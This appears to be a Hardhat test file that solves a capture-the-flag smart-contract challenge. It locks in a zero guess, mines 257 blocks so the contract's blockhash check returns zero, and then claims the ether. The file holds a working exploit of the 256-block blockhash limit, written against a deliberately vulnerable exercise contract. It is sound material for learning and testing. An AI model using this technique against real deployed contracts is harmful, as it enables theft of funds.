import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
      // guess a 0 and then wait for 256 blocks until blockhash returns 0
    // block.blockhash(uint blockNumber) returns (bytes32):
    // hash of the given block - only works for 256 most recent, excluding current, blocks
    await target.lockInGuess(
      `0x00000000000000000000000000000000000000000000000000000000000000`,
      {
        value: ethers.utils.parseEther(`1`),
      }
    );

    for (let i = 0; i < 257; i++) {
      await ethers.provider.send("evm_increaseTime", [1]); // add 1 second
      await ethers.provider.send("evm_mine", [
        /* timestamp */
      ]); // mine the next block
      console.log(await ethers.provider.getBlockNumber());
    }

    await target.settle();

    expect(await target.isComplete()).to.equal(true);
  });
});
